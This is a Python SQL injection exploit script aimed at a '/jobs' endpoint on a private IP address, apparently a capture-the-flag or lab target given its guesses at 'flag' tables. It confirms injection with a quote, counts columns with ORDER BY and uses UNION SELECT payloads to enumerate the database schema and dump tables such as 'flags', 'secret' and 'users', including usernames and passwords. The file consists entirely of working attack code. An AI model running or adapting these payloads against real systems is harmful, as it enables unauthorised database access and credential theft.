import requests
import json

TARGET_URL = "http://10.0.162.112:80/jobs"

PAYLOADS = [
    "back-end' ORDER BY 1-- ",
    "back-end' ORDER BY 2-- ",
    "back-end' ORDER BY 3-- ",
    "back-end' ORDER BY 4-- ",
    "back-end' ORDER BY 5-- ",
    "back-end' UNION SELECT 1,2,3,4-- ",
    "back-end' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'-- ",
    "back-end' UNION SELECT 1,group_concat(sql),3,4 FROM sqlite_master WHERE type='table'-- ",
    "back-end' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- ",
    "back-end' UNION SELECT 1,2,3,4#",
    "back-end' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'#",
]

def main():
    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})

    print(f"[*] Target: {TARGET_URL}")
    print("=" * 80)

    # First, test normal request
    print("[*] Testing normal request with job_type='back-end'")
    try:
        normal_resp = session.post(TARGET_URL, json={"job_type": "back-end"}, timeout=10)
        print(f"    Status: {normal_resp.status_code}")
        print(f"    Response: {normal_resp.text}")
    except Exception as e:
        print(f"    Error: {e}")
    print("=" * 80)

    # Test single quote to confirm injection
    print("[*] Testing single quote injection")
    try:
        sqli_resp = session.post(TARGET_URL, json={"job_type": "back-end'"}, timeout=10)
        print(f"    Status: {sqli_resp.status_code}")
        print(f"    Response: {sqli_resp.text}")
    except Exception as e:
        print(f"    Error: {e}")
    print("=" * 80)

    # Iterate through all payloads
    for idx, payload in enumerate(PAYLOADS, 1):
        print(f"\n[{idx}] Payload: {payload}")
        print("-" * 80)
        try:
            resp = session.post(TARGET_URL, json={"job_type": payload}, timeout=10)
            print(f"    Status Code: {resp.status_code}")
            try:
                parsed = resp.json()
                print(f"    Response (JSON): {json.dumps(parsed, indent=2, ensure_ascii=False)}")
            except:
                print(f"    Response (Text): {resp.text[:2000]}")
        except requests.exceptions.Timeout:
            print("    Error: Request timed out")
        except requests.exceptions.ConnectionError:
            print("    Error: Connection error")
        except Exception as e:
            print(f"    Error: {e}")
        print("-" * 80)

    # Additional exploration: if tables found, try to extract data from likely flag tables
    extra_payloads = [
        "back-end' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'-- ",
        "back-end' UNION SELECT 1,group_concat(sql),3,4 FROM sqlite_master WHERE type='table'#",
        "back-end' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0-- ",
        "back-end' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1-- ",
        "back-end' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 2-- ",
        "back-end' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 3-- ",
        "back-end' UNION SELECT 1,group_concat(flag),3,4 FROM flag-- ",
        "back-end' UNION SELECT 1,group_concat(flag),3,4 FROM flags-- ",
        "back-end' UNION SELECT 1,group_concat(secret),3,4 FROM secret-- ",
        "back-end' UNION SELECT 1,group_concat(password),3,4 FROM users-- ",
        "back-end' UNION SELECT 1,group_concat(username || ':' || password),3,4 FROM users-- ",
        "back-end' UNION SELECT 1,group_concat(id || ':' || name || ':' || type || ':' || description),3,4 FROM jobs-- ",
    ]

    print("\n\n[*] Extra exploration payloads:")
    print("=" * 80)
    for idx, payload in enumerate(extra_payloads, 1):
        print(f"\n[Extra {idx}] Payload: {payload}")
        print("-" * 80)
        try:
            resp = session.post(TARGET_URL, json={"job_type": payload}, timeout=10)
            print(f"    Status Code: {resp.status_code}")
            try:
                parsed = resp.json()
                print(f"    Response (JSON): {json.dumps(parsed, indent=2, ensure_ascii=False)}")
            except:
                print(f"    Response (Text): {resp.text[:2000]}")
        except requests.exceptions.Timeout:
            print("    Error: Request timed out")
        except requests.exceptions.ConnectionError:
            print("    Error: Connection error")
        except Exception as e:
            print(f"    Error: {e}")
        print("-" * 80)

if __name__ == "__main__":
    main()